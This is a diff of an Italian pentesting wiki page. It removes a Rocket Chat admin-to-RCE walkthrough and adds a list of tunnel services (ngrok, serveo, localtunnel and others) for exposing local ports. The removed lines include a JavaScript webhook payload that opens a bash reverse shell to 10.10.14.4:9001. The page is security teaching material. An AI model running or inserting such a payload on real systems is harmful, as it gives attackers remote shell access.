@@ -1,4 +1,4 @@
-# Rocket Chat
+# Esporre locale a Internet
 
 {% hint style="success" %}
 Impara e pratica AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
@@ -15,44 +15,75 @@ Impara e pratica GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" d
 </details>
 {% endhint %}
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+**L'obiettivo di questa pagina è proporre alternative che consentano ALMENO di esporre porte TCP raw locali e web locali (HTTP) a Internet SENZA la necessità di installare nulla nell'altro server (solo in locale se necessario).**
 
-{% embed url="https://websec.nl/" %}
+## **Serveo**
 
-## RCE
+Da [https://serveo.net/](https://serveo.net/), consente diverse funzionalità di forwarding http e porte **gratuitamente**.
+```bash
+# Get a random port from serveo.net to expose local port 4444
+ssh -R 0:localhost:4444 serveo.net
 
-Se sei admin all'interno di Rocket Chat puoi ottenere RCE.
-
-* Vai a **`Integrations`** e seleziona **`New Integration`** e scegli qualsiasi: **`Incoming WebHook`** o **`Outgoing WebHook`**.
-* `/admin/integrations/incoming`
-
-<figure><img src="../../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>
-
-* Secondo la [documentazione](https://docs.rocket.chat/guides/administration/admin-panel/integrations), entrambi usano ES2015 / ECMAScript 6 ([fondamentalmente JavaScript](https://codeburst.io/javascript-wtf-is-es6-es8-es-2017-ecmascript-dca859e4821c)) per elaborare i dati. Quindi otteniamo una [rev shell per javascript](../../generic-hacking/reverse-shells/linux.md#nodejs) come:
-```javascript
-const require = console.log.constructor('return process.mainModule.require')();
-const { exec } = require('child_process');
-exec("bash -c 'bash -i >& /dev/tcp/10.10.14.4/9001 0>&1'")
+# Expose a web listening in localhost:300 in a random https URL
+ssh -R 80:localhost:3000 serveo.net
 ```
-* Configura il WebHook (il canale e il post come nome utente devono esistere):
+## SocketXP
 
-<figure><img src="../../.gitbook/assets/image (905).png" alt=""><figcaption></figcaption></figure>
+Da [https://www.socketxp.com/download](https://www.socketxp.com/download), consente di esporre tcp e http:
+```bash
+# Expose tcp port 22
+socketxp connect tcp://localhost:22
 
-* Configura lo script WebHook:
+# Expose http port 8080
+socketxp connect http://localhost:8080
+```
+## Ngrok
 
-<figure><img src="../../.gitbook/assets/image (572).png" alt=""><figcaption></figcaption></figure>
+Da [https://ngrok.com/](https://ngrok.com/), consente di esporre porte http e tcp:
+```bash
+# Expose web in 3000
+ngrok http 8000
 
-* Salva le modifiche
-* Ottieni l'URL del WebHook generato:
+# Expose port in 9000 (it requires a credit card, but you won't be charged)
+ngrok tcp 9000
+```
+## Telebit
 
-<figure><img src="../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>
+Da [https://telebit.cloud/](https://telebit.cloud/) consente di esporre porte http e tcp:
+```bash
+# Expose web in 3000
+/Users/username/Applications/telebit/bin/telebit http 3000
 
-* Chiamalo con curl e dovresti ricevere la rev shell
+# Expose port in 9000
+/Users/username/Applications/telebit/bin/telebit tcp 9000
+```
+## LocalXpose
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+Da [https://localxpose.io/](https://localxpose.io/), consente diverse funzionalità di forwarding http e porte **gratuitamente**.
+```bash
+# Expose web in port 8989
+loclx tunnel http -t 8989
 
-{% embed url="https://websec.nl/" %}
+# Expose tcp port in 4545 (requires pro)
+loclx tunnel tcp --port 4545
+```
+## Expose
 
+Da [https://expose.dev/](https://expose.dev/) consente di esporre porte http e tcp:
+```bash
+# Expose web in 3000
+./expose share http://localhost:3000
+
+# Expose tcp port in port 4444 (REQUIRES PREMIUM)
+./expose share-port 4444
+```
+## Localtunnel
+
+Da [https://github.com/localtunnel/localtunnel](https://github.com/localtunnel/localtunnel) consente di esporre http gratuitamente:
+```bash
+# Expose web in port 8000
+npx localtunnel --port 8000
+```
 {% hint style="success" %}
 Impara e pratica il hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
 Impara e pratica il hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
